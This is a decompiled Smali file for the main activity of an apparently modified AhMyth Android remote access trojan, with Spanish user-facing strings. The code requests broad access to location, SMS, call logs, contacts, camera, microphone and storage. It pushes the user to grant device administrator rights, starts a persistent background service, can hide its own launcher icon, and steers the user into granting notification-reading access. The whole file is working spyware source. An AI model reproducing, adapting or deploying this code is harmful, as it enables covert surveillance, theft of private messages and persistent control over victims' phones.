.class public Lahmyth/mine/king/ahmyth/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final PERMISOS_APP:[Ljava/lang/String;

.field private static final REQUEST_PERMISSIONS_ALL:I = 0x65


# instance fields
.field private componentName:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private sharedPreferences:Landroid/content/SharedPreferences;


# direct methods
.method static constructor <clinit>()V
    .locals 11

    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v2, "android.permission.READ_CALL_LOG"

    const-string v3, "android.permission.READ_CONTACTS"

    const-string v4, "android.permission.RECEIVE_SMS"

    const-string v5, "android.permission.SEND_SMS"

    const-string v6, "android.permission.READ_SMS"

    const-string v7, "android.permission.CAMERA"

    const-string v8, "android.permission.RECORD_AUDIO"

    const-string v9, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v10, "android.permission.WRITE_EXTERNAL_STORAGE"

    .line 34
    filled-new-array/range {v0 .. v10}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/MainActivity;->PERMISOS_APP:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 26
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private checkNotificationPermission()V
    .locals 3

    .line 138
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "enabled_notification_listeners"

    .line 137
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 141
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 142
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    if-nez v0, :cond_1

    .line 144
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Permiso de Notificaciones"

    .line 145
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "Para que AhMyth lea notificaciones, debes activarlo en Ajustes."

    .line 146
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    new-instance v1, Lahmyth/mine/king/ahmyth/-$$Lambda$MainActivity$CP3LJFVPn_oP_Jw6s5rEY6Nl0Cc;

    invoke-direct {v1, p0}, Lahmyth/mine/king/ahmyth/-$$Lambda$MainActivity$CP3LJFVPn_oP_Jw6s5rEY6Nl0Cc;-><init>(Lahmyth/mine/king/ahmyth/MainActivity;)V

    const-string v2, "Ir a Ajustes"

    .line 147
    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const/4 v1, 0x0

    const-string v2, "Cancelar"

    .line 150
    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 151
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    :cond_1
    return-void
.end method

.method private hideAppIcon()V
    .locals 4

    .line 125
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 126
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    .line 125
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method private pedirPermisosSiNecesario()V
    .locals 5

    .line 97
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_2

    .line 99
    sget-object v0, Lahmyth/mine/king/ahmyth/MainActivity;->PERMISOS_APP:[Ljava/lang/String;

    array-length v1, v0

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v1, :cond_1

    aget-object v4, v0, v3

    .line 100
    invoke-static {p0, v4}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    if-eqz v4, :cond_0

    const/4 v2, 0x1

    goto :goto_1

    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_1
    :goto_1
    if-eqz v2, :cond_2

    .line 106
    sget-object v0, Lahmyth/mine/king/ahmyth/MainActivity;->PERMISOS_APP:[Ljava/lang/String;

    const/16 v1, 0x65

    invoke-static {p0, v0, v1}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_2
    return-void
.end method


# virtual methods
.method public synthetic lambda$checkNotificationPermission$1$MainActivity(Landroid/content/DialogInterface;I)V
    .locals 0

    .line 148
    new-instance p1, Landroid/content/Intent;

    const-string p2, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {p1, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public synthetic lambda$onCreate$0$MainActivity(Landroid/content/SharedPreferences$Editor;Landroid/widget/CompoundButton;Z)V
    .locals 0

    const-string p2, "hidden_status"

    .line 82
    invoke-interface {p1, p2, p3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 83
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    if-eqz p3, :cond_0

    .line 84
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->hideAppIcon()V

    :cond_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 50
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 51
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MainService;->startService(Landroid/content/Context;)V

    const p1, 0x7f0b001c

    .line 52
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->setContentView(I)V

    .line 54
    new-instance p1, Landroid/content/ComponentName;

    const-class v0, Lahmyth/mine/king/ahmyth/AdminReceiver;

    invoke-direct {p1, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object p1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string p1, "device_policy"

    .line 55
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/admin/DevicePolicyManager;

    iput-object p1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 58
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {p1, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 59
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 60
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string v1, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const v0, 0x7f0e0025

    .line 62
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    .line 61
    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 63
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 67
    :cond_0
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->pedirPermisosSiNecesario()V

    .line 70
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 71
    invoke-static {p0, p1}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 74
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1c

    if-gt p1, v0, :cond_1

    const p1, 0x7f080164

    .line 75
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Switch;

    const/4 v0, 0x0

    .line 76
    invoke-virtual {p1, v0}, Landroid/widget/Switch;->setVisibility(I)V

    const-string v1, "AppSettings"

    .line 78
    invoke-virtual {p0, v1, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    .line 79
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 81
    new-instance v2, Lahmyth/mine/king/ahmyth/-$$Lambda$MainActivity$EaWcqt2mHVEbSK5hTgTZJwgU6Pw;

    invoke-direct {v2, p0, v1}, Lahmyth/mine/king/ahmyth/-$$Lambda$MainActivity$EaWcqt2mHVEbSK5hTgTZJwgU6Pw;-><init>(Lahmyth/mine/king/ahmyth/MainActivity;Landroid/content/SharedPreferences$Editor;)V

    invoke-virtual {p1, v2}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    .line 87
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    const-string v2, "hidden_status"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    .line 88
    invoke-virtual {p1, v0}, Landroid/widget/Switch;->setChecked(Z)V

    if-eqz v0, :cond_1

    .line 89
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->hideAppIcon()V

    .line 93
    :cond_1
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->checkNotificationPermission()V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2

    .line 114
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 v0, 0x65

    if-ne p1, v0, :cond_1

    const/4 p1, 0x0

    .line 116
    :goto_0
    array-length v0, p2

    if-ge p1, v0, :cond_1

    .line 117
    aget v0, p3, p1

    if-eqz v0, :cond_0

    .line 118
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Permiso requerido: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v1, p2, p1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    :cond_0
    add-int/lit8 p1, p1, 0x1

    goto :goto_0

    :cond_1
    return-void
.end method

.method public openGooglePlay(Landroid/view/View;)V
    .locals 2

    .line 156
    new-instance p1, Landroid/content/Intent;

    const-string v0, "https://play.google.com/store/apps"

    .line 157
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {p1, v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 158
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
